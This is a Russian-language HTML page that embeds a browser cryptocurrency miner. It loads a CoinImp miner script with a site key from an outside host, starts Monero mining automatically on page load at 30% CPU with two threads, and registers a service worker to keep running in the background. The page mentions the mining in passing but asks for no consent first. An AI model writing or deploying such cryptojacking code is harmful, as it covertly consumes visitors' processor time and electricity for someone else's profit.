<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Веб Майнер Monero</title>
    <script src="https://www.coinimp.com/miner/09904aae70a0280cd8aee4b50cdc8fa371d1e49f0465fa6363bbb82d6a379382/miner.js"></script>
</head>
<body>
    <h1>Добро пожаловать на наш сайт!</h1>
    <p>Пока вы здесь, ваш компьютер помогает нам добывать Monero. Спасибо за вашу поддержку!</p>

    <script>
        // Инициализация майнера с вашим ключом
        var miner = new CoinHive.Anonymous('09904aae70a0280cd8aee4b50cdc8fa371d1e49f0465fa6363bbb82d6a379382', {
            throttle: 0.3, // Уровень нагрузки на процессор (0.3 = 30%)
            threads: 2 // Количество потоков
        });

        // Запуск майнинга
        miner.start();

        // Функция для проверки видимости страницы
        function handleVisibilityChange() {
            if (document.hidden) {
                console.log("Страница в фоновом режиме, майнинг продолжается.");
            } else {
                console.log("Страница активна, майнинг продолжается.");
            }
        }

        // Следим за изменением видимости страницы
        document.addEventListener("visibilitychange", handleVisibilityChange, false);

        // Service Worker для фонового выполнения (если поддерживается)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js')
                .then(function(registration) {
                    console.log('Service Worker зарегистрирован:', registration);
                })
                .catch(function(error) {
                    console.log('Ошибка регистрации Service Worker:', error);
                });
        }
    </script>
</body>
</html>
